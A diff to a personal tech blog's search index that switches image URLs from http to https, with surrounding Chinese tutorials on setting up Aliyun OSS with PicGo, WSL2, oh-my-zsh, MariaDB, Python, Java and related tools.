-<img data-src="http://img.owq.world/2021/11/2240-55d797.png" style="zoom: 50%;" />
+<img data-src="https://img.owq.world/2021/11/2240-55d797.png" style="zoom: 50%;" />
 
 <p>配置好后按进入下一步按系统提示配置CNAME，之后这些都可以修改，所以可以先走一遍流程然后回头再详细配置下。</p>
 <h2 id="CDN配置"><a href="#CDN配置" class="headerlink" title="CDN配置"></a>CDN配置</h2><p>回到Bucket管理配置下缓存自动刷新，将其开启.</p>
-<p><img data-src="http://img.owq.world/2021/11/1229-76fcbb.png"></p>
-<p>全部勾上就行了<br><img data-src="http://img.owq.world/2021/11/1230-af5e88.png" style="zoom: 80%;" /></p>
-<p>弄好后打开<code>CDN控制台</code><br><img data-src="http://img.owq.world/2021/11/2246-aba139.png" alt="" style="zoom: 67%;" /></p>
+<p><img data-src="https://img.owq.world/2021/11/1229-76fcbb.png"></p>
+<p>全部勾上就行了<br><img data-src="https://img.owq.world/2021/11/1230-af5e88.png" style="zoom: 80%;" /></p>
+<p>弄好后打开<code>CDN控制台</code><br><img data-src="https://img.owq.world/2021/11/2246-aba139.png" alt="" style="zoom: 67%;" /></p>
 <p>打开配置</p>
-<p><img data-src="http://img.owq.world/2021/11/1243-0192a4.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/1243-0192a4.png"></p>
 <p>配置回源设置，让通过CDN的链接可以访问到OSS里面内容，顺便指定下回源协议为http</p>
-<p><img data-src="http://img.owq.world/2021/11/1246-6948f3.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/1246-6948f3.png"></p>
 <p>其它配置可以等流程走完再去弄</p>
 <h2 id="创建管理用户"><a href="#创建管理用户" class="headerlink" title="创建管理用户"></a>创建管理用户</h2><blockquote>
 <p>专门用来访问oss存储的账户</p>
 </blockquote>
 <p>点击右上角的个人头像，打开访问控制</p>
-<img data-src="http://img.owq.world/2021/11/2128-5d7085.png" style="zoom: 67%;" />
+<img data-src="https://img.owq.world/2021/11/2128-5d7085.png" style="zoom: 67%;" />
 
 <p>创建用户</p>
-<img data-src="http://img.owq.world/2021/11/2135-cdb631.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2135-cdb631.png" style="zoom:50%;" />
 
 <p>输入登录和显示名称,勾上 <code>Open API 调用访问</code>, 然后点击确认</p>
-<img data-src="http://img.owq.world/2021/11/2136-25099d.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2136-25099d.png" style="zoom:50%;" />
 
 <p>创建成功后记得保存好<code>AccessKey</code>信息</p>
-<p><img data-src="http://img.owq.world/2021/11/2139-e4162c.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2139-e4162c.png"></p>
 <p>接下来为刚刚创建的用户添加权限</p>
-<p><img data-src="http://img.owq.world/2021/11/2142-4c4b7f.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2142-4c4b7f.png"></p>
 <p>添加 <code>AliyunOSSFullAccess</code> 用来管理OSS, 确认完毕后管理用户就配置好了</p>
-<img data-src="http://img.owq.world/2021/11/2143-3fcdd0.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2143-3fcdd0.png" style="zoom:50%;" />
 
 <h2 id="PicGO配置"><a href="#PicGO配置" class="headerlink" title="PicGO配置"></a>PicGO配置</h2><p>将刚刚生成的<code>AccessKey</code>信息填进去，然后填写你的<code>Bucket</code>名和存储区域还有域名，其它可以自定义。</p>
-<img data-src="http://img.owq.world/2021/11/1214-2b0efd.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/1214-2b0efd.png" style="zoom:50%;" />
 
 <p>随便上传一张图像，然后访问图像地址正常显示就成功了，如有意外请参照阿里云帮助文档<del>笑</del>。</p>
 <h2 id="OSS管理器"><a href="#OSS管理器" class="headerlink" title="OSS管理器"></a>OSS管理器</h2><blockquote>
@@ -1685,15 +1685,15 @@
 </li>
 <li><p>解压(位置随意)</p>
 <p>这里解压到<code>C:\Tools\scrcpy</code><br>因为包自带<code>adb</code>工具, 这里可以不用额外配置<code>adb</code>, 已配置好的可以忽略</p>
-<img data-src="http://img.owq.world/2021/11/2124-7e8658.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2124-7e8658.png" style="zoom:50%;" />
 </li>
 <li><p>设置环境变量</p>
-<p>系统属性 - 环境变量 - 新增Path变量 -添加解压目录<br><img data-src="http://img.owq.world/2021/11/2127-fb6625.png"></p>
+<p>系统属性 - 环境变量 - 新增Path变量 -添加解压目录<br><img data-src="https://img.owq.world/2021/11/2127-fb6625.png"></p>
 </li>
 <li><p>验证测试</p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb 版本</span></span><br><span class="line">adb version</span><br><span class="line"></span><br><span class="line"><span class="comment"># scrcpy 版本</span></span><br><span class="line">scrcpy <span class="literal">-v</span></span><br></pre></td></tr></table></figure>
 
-<img data-src="http://img.owq.world/2021/11/2124-6ca332.png" alt="" style="zoom:67%;" />
+<img data-src="https://img.owq.world/2021/11/2124-6ca332.png" alt="" style="zoom:67%;" />
 
 <p>成功输出版本信息则配置完成~</p>
 </li>
@@ -2139,7 +2139,7 @@
 <p>来自 Erlang之父 Joe Armstrong 的解释</p>
 <p>并发：两个队列和一台咖啡机<br>并行：两个队列和两台咖啡机</p>
 </blockquote>
-<p><img data-src="http://img.owq.world/2021/11/2134-81fe70.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2134-81fe70.png"></p>
 <ul>
 <li>并发表示<strong>多个程序可以在同一个时间段内被执行</strong></li>
 <li>并行表示多个程序可以在<strong>同一时刻</strong>被运行</li>
@@ -2285,7 +2285,7 @@
 <h2 id="记录流程图"><a href="#记录流程图" class="headerlink" title="记录流程图"></a>记录流程图</h2><blockquote>
 <p>有个印象(～￣▽￣)～</p>
 </blockquote>
-<img data-src="http://img.owq.world/2021/11/2123-044c15.png" style="border-radius: 0px;" />
+<img data-src="https://img.owq.world/2021/11/2123-044c15.png" style="border-radius: 0px;" />
 
 
 
@@ -2442,7 +2442,7 @@
 <h3 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><p>这里修改下Nginx的默认站点配置</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx/</span><br><span class="line">vim sites-enabled/default</span><br></pre></td></tr></table></figure>
 
-<p>里面长这样 ↓<br><img data-src="http://img.owq.world/2021/11/2122-11343b.png"  /></p>
+<p>里面长这样 ↓<br><img data-src="https://img.owq.world/2021/11/2122-11343b.png"  /></p>
 <p>这里修改root网站根目录就行了，其它可以保持不动</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">root /var/www/hexo;</span><br></pre></td></tr></table></figure>
 
@@ -2508,9 +2508,9 @@
 <p>官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy9nZW5lcmFsLXVzZS9oaWRwaS8=">🚪</span></p>
 </blockquote>
 <p>菜单搜索<code>hidpi</code>, 打开它</p>
-<p><img data-src="http://img.owq.world/2021/11/2110-eb457c.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2110-eb457c.png"></p>
 <p>默认缩放2X, 点击<code>是</code>确认, 然后开始愉快的Linux之旅吧~</p>
-<p><img data-src="http://img.owq.world/2021/11/2110-542567.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2110-542567.png"></p>
 <p><em>注:如果要自定义缩放因子请参考官方文档</em></p>
 <h2 id="快捷启动"><a href="#快捷启动" class="headerlink" title="快捷启动"></a>快捷启动</h2><ul>
 <li>添加到<code>Windows Termial</code>启动</li>
@@ -2552,7 +2552,7 @@
 
 <hr>
 <h2 id="旧版安装方法"><a href="#旧版安装方法" class="headerlink" title="旧版安装方法"></a>旧版安装方法</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><code>Win+S</code> 搜索, 用<strong>管理员权限</strong>运行<code>Windows PowerShell</code>, 或使用<code>Win+X</code>打开菜单运行选择<code>Windows PowerShell</code>.（接下来的命令都是在这个终端上执行.）</p>
-<img data-src="http://img.owq.world/2021/11/2125-658665.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2125-658665.png" style="zoom:50%;" />
 
 <ol>
 <li><h3 id="启用-WSL-子系统"><a href="#启用-WSL-子系统" class="headerlink" title="启用 WSL 子系统"></a>启用 WSL 子系统</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Windows-Subsystem-Linux</span> /all /norestart</span><br></pre></td></tr></table></figure>
@@ -2562,7 +2562,7 @@
 <p>到了这一步要 <strong>重启计算机</strong> 进行应用(更新)</p>
 </li>
 <li><h3 id="下载-Linux-内核更新包"><a href="#下载-Linux-内核更新包" class="headerlink" title="下载 Linux 内核更新包"></a>下载 Linux 内核更新包</h3><p><strong>选择自己计算机内核架构对应的包</strong>, 输入命令<code>systeminfo</code>查看</p>
-<img data-src="http://img.owq.world/2021/12/1804-e90d61.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/12/1804-e90d61.png" style="zoom:50%;" />
 
 <ul>
 <li><span class="exturl" data-url="aHR0cHM6Ly93c2xzdG9yZXN0b3JhZ2UuYmxvYi5jb3JlLndpbmRvd3MubmV0L3dzbGJsb2Ivd3NsX3VwZGF0ZV94NjQubXNp">x64更新包</span></li>
@@ -2603,7 +2603,7 @@
 </blockquote>
 <h3 id="内存配置"><a href="#内存配置" class="headerlink" title="内存配置"></a>内存配置</h3><p>WSL2内存占用高的问题至今存在，修改Windows位于用户目录<code>%home%</code>下的<code>.wslconfig</code>文件，若没有则自己创建一个.</p>
 <p>ps:直接在资源管理器输入<code>%home%</code>按回车就可跳转, 若出错则是电脑环境变量没有配置好</p>
-<img data-src="http://img.owq.world/2021/11/2125-5f3eaf.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2125-5f3eaf.png" style="zoom:50%;" />
 
 <h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>主要配置内存和交换内存, 其它可以不用管, 看自己电脑配置设置.</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[wsl2]</span></span><br><span class="line"><span class="comment"># 给 WSL 2 虚拟机分配的内存大小 (默认为本机内存的50%）</span></span><br><span class="line"><span class="attr">memory</span>=<span class="number">8</span>GB</span><br><span class="line"><span class="comment"># 为 WSL 2 虚拟机分配的交换空间 (0 表示没有交换空间, 一般设置为本机内存的25%)</span></span><br><span class="line"><span class="attr">swap</span>=<span class="number">0</span></span><br><span class="line"><span class="comment"># 自定义交换虚拟磁盘 vhd 的绝对路径 (可选配置)</span></span><br><span class="line"><span class="attr">swapFile</span>=&lt;path&gt;</span><br><span class="line"><span class="comment"># 是否允许将 WSL 2 的端口转发到主机（默认为 true）</span></span><br><span class="line"><span class="attr">localhostForwarding</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
@@ -2659,7 +2659,7 @@
 <p>死马当活马医😂</p>
 </blockquote>
 <p>进入 <span class="exturl" data-url="aHR0cHM6Ly93d3cuaXBhZGRyZXNzLmNvbS8=">https://www.ipaddress.com/</span> 获取域名的映射IP</p>
-<p><img data-src="http://img.owq.world/2021/11/2123-f639cc.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2123-f639cc.png"></p>
 <p>修改<code>hosts</code>文件</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>
 
@@ -2669,7 +2669,7 @@
 <h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><blockquote>
 <p>主题文件位于 <code>.oh-my-zsh/themes</code> 目录下，可自定义修改</p>
 </blockquote>
-<h3 id="简单实用的"><a href="#简单实用的" class="headerlink" title="简单实用的"></a>简单实用的</h3><img data-src="http://img.owq.world/2021/11/2124-f27aa9.png" style="zoom:80%;" />
+<h3 id="简单实用的"><a href="#简单实用的" class="headerlink" title="简单实用的"></a>简单实用的</h3><img data-src="https://img.owq.world/2021/11/2124-f27aa9.png" style="zoom:80%;" />
 
 <p>修改<code>~/.zshrc</code> 配置文件</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ZSH_THEME</span>=<span class="string">&quot;ys&quot;</span></span><br></pre></td></tr></table></figure>
@@ -2677,7 +2677,7 @@
 <h3 id="powerlevel10"><a href="#powerlevel10" class="headerlink" title="powerlevel10"></a>powerlevel10</h3><blockquote>
 <p>仓库传送门 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvbWthdHYvcG93ZXJsZXZlbDEwaw==">🚪</span></p>
 </blockquote>
-<img data-src="http://img.owq.world/2022/05/1500-a5e012.png" style="zoom:80%;" />
+<img data-src="https://img.owq.world/2022/05/1500-a5e012.png" style="zoom:80%;" />
 
 <h4 id="从储存库安装"><a href="#从储存库安装" class="headerlink" title="从储存库安装"></a>从储存库安装</h4><p>克隆主题包到主题目录</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>
@@ -2692,7 +2692,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;source /usr/share/zsh-theme-powerlevel10k/powerlevel10k.zsh-theme&#x27;</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
 
 <p>重新进入shell配置即可</p>
-<h3 id="powerline"><a href="#powerline" class="headerlink" title="powerline"></a>powerline</h3><img data-src="http://img.owq.world/2021/11/2124-9962fa.png" style="zoom: 80%;" />
+<h3 id="powerline"><a href="#powerline" class="headerlink" title="powerline"></a>powerline</h3><img data-src="https://img.owq.world/2021/11/2124-9962fa.png" style="zoom: 80%;" />
 
 <blockquote>
 <p>仓库传送门 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plcmVteUZyZWVBZ2VudC9vaC1teS16c2gtcG93ZXJsaW5lLXRoZW1l">🚪</span></p>
@@ -2810,32 +2810,32 @@
 </ul>
 <h2 id="下载-MariaDB-安装包"><a href="#下载-MariaDB-安装包" class="headerlink" title="下载 MariaDB 安装包"></a>下载 MariaDB 安装包</h2><p><span class="exturl" data-url="aHR0cHM6Ly9tYXJpYWRiLmNvbS9kb3dubG9hZHMv">官网下载</span></p>
 <p>打开后大概是这个样子，这里要注意下，不同时期网站的外观可能会不同，但软件的下载页地址是不会变的。</p>
-<p><img data-src="http://img.owq.world/2021/11/2111-62424c.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2111-62424c.png"></p>
 <p>软件版本选择默认(最新版)就行了<br>手动选择下系统版本, Windows 64位选择 <code>MS Windows (64-bit)</code><br>如果不知道自己的系统是多少位的, 那就选择32位包 <code>MS Windows (32-bit)</code><br>选择好后, 你会发现下面的链接是会变的, 这就是你要下载的文件, 让我们点击 <code>Download</code> 开始下载</p>
-<p><img data-src="http://img.owq.world/2021/11/2112-284361.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2112-284361.png"></p>
 <p>点击后会跳转到 &quot;感谢下载&quot; 页面, 这时候等待下载链接建立起来就行了</p>
-<p><img data-src="http://img.owq.world/2021/11/2115-3660c6.png"></p>
-<h2 id="安装-MariaDB"><a href="#安装-MariaDB" class="headerlink" title="安装 MariaDB"></a>安装 MariaDB</h2><img data-src="http://img.owq.world/2021/11/2114-1271e8.png" style="zoom:50%;" />
+<p><img data-src="https://img.owq.world/2021/11/2115-3660c6.png"></p>
+<h2 id="安装-MariaDB"><a href="#安装-MariaDB" class="headerlink" title="安装 MariaDB"></a>安装 MariaDB</h2><img data-src="https://img.owq.world/2021/11/2114-1271e8.png" style="zoom:50%;" />
 
 <p>勾选&quot;接受使用许可条款&quot;, 然后<code>Next</code>进入下一步</p>
-<img data-src="http://img.owq.world/2021/11/2115-52857d.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2115-52857d.png" style="zoom:50%;" />
 
 <p>左边区域是要安装的组件, 右边是对应组件的说明, 默认设置就行了<br><em>(之后如果要删除不需要的组件, 重新打开安装包下就可以删除了)</em><br>点击 <code>Browse...</code> , 修改下储存路径, 默认软件是放在 C盘 下的<br>这里推荐放在其它盘里, 比如我就放在 <code>D:\Environment\MariaDB</code> 这个路径下</p>
-<img data-src="http://img.owq.world/2021/11/2116-2e7524.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2116-2e7524.png" style="zoom:50%;" />
 
 <p>设置 <code>root</code> 用户密码, 输入两次密码以确认, <strong>密码要记牢, 忘记的话就只能重新安装了</strong>, 然后勾上 <code>Use UTF8 as default server&#39;s character set</code>, 这个是设置 <code>*UTF-8*</code> 为默认编码的, 防止中文乱码必备选项</p>
-<img data-src="http://img.owq.world/2021/11/2116-7f0aec.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2116-7f0aec.png" style="zoom:50%;" />
 
 
 
 <p>设置服务名称, 这里我填的是 <code>MariaDB</code> , 名称是可以自定义的<br>设置访问端口号, 用来访问你的 MariaDB 数据库用的, 默认填 <code>3306</code> ,这个要牢记<br>下面的缓冲池大小不用管它, 对前期学习没有影响的</p>
-<img data-src="http://img.owq.world/2021/11/2116-59615f.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2116-59615f.png" style="zoom:50%;" />
 
 <p>开始安装...</p>
-<img data-src="http://img.owq.world/2021/11/2116-ff9d22.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2116-ff9d22.png" style="zoom:50%;" />
 
 <p>静待一会儿 就大功告成了~</p>
-<img data-src="http://img.owq.world/2021/11/2116-d26191.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2116-d26191.png" style="zoom:50%;" />
 ]]></content>
       <categories>
         <category>学习教程</category>
@@ -2851,28 +2851,28 @@
     <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>
 
 <h2 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kb3dubG9hZHMv">官网下载</span>, 刚开始学习的话直接下载最新版本的就行了</p>
-<p><img data-src="http://img.owq.world/2021/11/2120-1da682.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2120-1da682.png"></p>
 <p>默认下载为64位版本就行了 要下载32位请跳转<span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kb3dubG9hZHMvd2luZG93cy8=">详细页面下载</span></p>
-<p><img data-src="http://img.owq.world/2021/11/2120-92875c.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2120-92875c.png"></p>
 <h2 id="安装图示"><a href="#安装图示" class="headerlink" title="安装图示"></a>安装图示</h2><p>打开安装包 勾上环境变量 然后选择自定义安装</p>
-<img data-src="http://img.owq.world/2021/11/2118-b66de4.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2118-b66de4.png" style="zoom:50%;" />
 
 <p>配置安装选项 依需求更改 默认全勾上就行了 &gt;&gt; <strong>Next</strong></p>
-<img data-src="http://img.owq.world/2021/11/2120-00e3ae.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2120-00e3ae.png" style="zoom:50%;" />
 
 <p>勾上第一个选项 &quot;为全部用户安装&quot; &gt;&gt; <strong>Install</strong></p>
-<img data-src="http://img.owq.world/2021/11/2122-72c13f.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2122-72c13f.png" style="zoom:50%;" />
 
 <p>等待安装完成 然后点一下它 解除路径长度限制 &gt;&gt; <strong>Close</strong></p>
-<img data-src="http://img.owq.world/2021/11/2121-7daf02.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2121-7daf02.png" style="zoom:50%;" />
 
 
 
 <h2 id="验证安装结果"><a href="#验证安装结果" class="headerlink" title="验证安装结果"></a>验证安装结果</h2><p>Win + R 打开&quot;运行&quot; 输入 cmd 回车打开</p>
-<img data-src="http://img.owq.world/2021/11/2121-be174c.png" style="zoom:33%;" />
+<img data-src="https://img.owq.world/2021/11/2121-be174c.png" style="zoom:33%;" />
 
 <p>输入 <code>python -V</code> 查看 python 版本 如成功输出则安装成功</p>
-<img data-src="http://img.owq.world/2021/11/2122-8b7be8.png" style="zoom:33%;" />
+<img data-src="https://img.owq.world/2021/11/2122-8b7be8.png" style="zoom:33%;" />
 
 
 
@@ -2910,10 +2910,10 @@
 <ul>
 <li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UtZG93bmxvYWRzLmh0bWw=">官网</span></p>
 <p>官网的 Java 8 只提供安装包下载 可以到其它地方下载打包好的JDK,这里使用 Java 11 做为示例</p>
-<p><img data-src="http://img.owq.world/2021/11/2055-078cf6.png"><br><img data-src="http://img.owq.world/2021/11/2056-418efc.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2055-078cf6.png"><br><img data-src="https://img.owq.world/2021/11/2056-418efc.png"></p>
 </li>
 <li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYXp1bC5jb20vZG93bmxvYWRzL3p1bHUtY29tbXVuaXR5Lz9wYWNrYWdlPWpkaw==">Azul Zulu</span><br>网页往下拉，找到下载处，选择Java版本和系统，然后下载压缩包</p>
-<p><img data-src="http://img.owq.world/2021/11/2057-075278.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2057-075278.png"></p>
 </li>
 <li><p><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMTJoRnFBZ1BOQ0h6b09TV21xVG9qdmc=">网盘下载</span><br>提取码: 47w5</p>
 </li>
@@ -2935,29 +2935,29 @@
 </li>
 </ul>
 <h2 id="解压-Java-JDK"><a href="#解压-Java-JDK" class="headerlink" title="解压 Java JDK"></a>解压 Java JDK</h2><p>记住解压路径 这是 Java JDK 的根目录</p>
-<p><img data-src="http://img.owq.world/2021/11/2057-02a578.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2057-02a578.png"></p>
 <h2 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><p><code>Win + R</code> 运行 输入 <code>sysdm.cpl</code> 回车进入 系统属性配置</p>
-<img data-src="http://img.owq.world/2021/11/2058-06af6e.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2058-06af6e.png" style="zoom:50%;" />
 
 <p>依次点击 高级 &gt;&gt; 环境变量</p>
-<img data-src="http://img.owq.world/2021/11/2058-e21112.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2058-e21112.png" style="zoom:50%;" />
 
 <p>新建 变量名: <code>JAVA_HOME</code>  变量值: <code>C:\Java\jdk8.0.275</code>(刚刚解压的Java路径)</p>
-<img data-src="http://img.owq.world/2021/11/2102-13fe59.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2102-13fe59.png" style="zoom:50%;" />
 
 <p>双击 <strong>Path</strong> 环境变量  进入编辑 (图示操作也是可以的)</p>
-<img data-src="http://img.owq.world/2021/11/2102-9698ea.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2102-9698ea.png" style="zoom:50%;" />
 
 <p>新建变量 <code>%JAVA_HOME%/bin</code></p>
-<img data-src="http://img.owq.world/2021/11/2103-f557ae.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2103-f557ae.png" style="zoom:50%;" />
 
 <p>Win7 下添加环境变量要用<strong>分号</strong>隔开</p>
-<img data-src="http://img.owq.world/2021/11/2103-ee21ba.png" style="zoom:80%;" />
+<img data-src="https://img.owq.world/2021/11/2103-ee21ba.png" style="zoom:80%;" />
 
 
 
 <h2 id="检验环境"><a href="#检验环境" class="headerlink" title="检验环境"></a>检验环境</h2><p><code>Win +R</code> 运行 cmd 输入 <code>java -version</code>  输出版本信息</p>
-<p><img data-src="http://img.owq.world/2021/11/2103-5f568b.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2103-5f568b.png"></p>
 <h2 id="错误排查"><a href="#错误排查" class="headerlink" title="错误排查"></a>错误排查</h2><ul>
 <li>若是没有正常输出 请检查环境变量的<strong>路径</strong>是否配置正确</li>
 <li>在 cmd 窗口 输入 <code>echo %JAVA_HOME%</code> 查看路径<ul>
@@ -2967,7 +2967,7 @@
 </ul>
 </li>
 <li>在 cmd 窗口 输入 <code>echo %PATH%</code> 查看 是否有 <code>%JAVA_HOME%\bin</code><ul>
-<li>系统会自动把 <code>%JAVA_HOME%</code> 变量转换成路径<br><img data-src="http://img.owq.world/2021/11/2103-615b99.png"></li>
+<li>系统会自动把 <code>%JAVA_HOME%</code> 变量转换成路径<br><img data-src="https://img.owq.world/2021/11/2103-615b99.png"></li>
 </ul>
 </li>
 </ul>
@@ -2995,7 +2995,7 @@
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">crontab -r </span><br></pre></td></tr></table></figure>
 
 <p><em>注: 新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。</em></p>
-<h2 id="图解命令"><a href="#图解命令" class="headerlink" title="图解命令"></a>图解命令</h2><p><img data-src="http://img.owq.world/2021/11/1717-e7ebb9.png"></p>
+<h2 id="图解命令"><a href="#图解命令" class="headerlink" title="图解命令"></a>图解命令</h2><p><img data-src="https://img.owq.world/2021/11/1717-e7ebb9.png"></p>
 <h2 id="命令示例"><a href="#命令示例" class="headerlink" title="命令示例"></a>命令示例</h2><table>
 <thead>
 <tr>
@@ -3807,8 +3807,8 @@
 <td>紧急修复线上代码的 bug</td>
 </tr>
 </tbody></table>
-<h2 id="工作流程图"><a href="#工作流程图" class="headerlink" title="工作流程图"></a>工作流程图</h2><h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><p><img data-src="http://img.owq.world/2022/05/1202-904caf.png"></p>
-<h3 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h3><p><img data-src="http://img.owq.world/2022/05/1202-f68d47.png"></p>
+<h2 id="工作流程图"><a href="#工作流程图" class="headerlink" title="工作流程图"></a>工作流程图</h2><h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><p><img data-src="https://img.owq.world/2022/05/1202-904caf.png"></p>
+<h3 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h3><p><img data-src="https://img.owq.world/2022/05/1202-f68d47.png"></p>
 ]]></content>
       <categories>
         <category>命令文档</category>
@@ -3840,10 +3840,10 @@
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>pacman.conf</span><br></pre></td></tr></table></figure>
 
 <p>取消 <code>#Color</code> 一行的注释, 在下面添加 <code>ILoveCandy</code></p>
-<img data-src="http://img.owq.world/2022/09/1046-12bc31.png" alt="" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2022/09/1046-12bc31.png" alt="" style="zoom:50%;" />
 
 <p>效果展示</p>
-<p><img data-src="http://img.owq.world/2022/09/1037-bc566b.png"></p>
+<p><img data-src="https://img.owq.world/2022/09/1037-bc566b.png"></p>
 ]]></content>
       <categories>
         <category>命令文档</category>
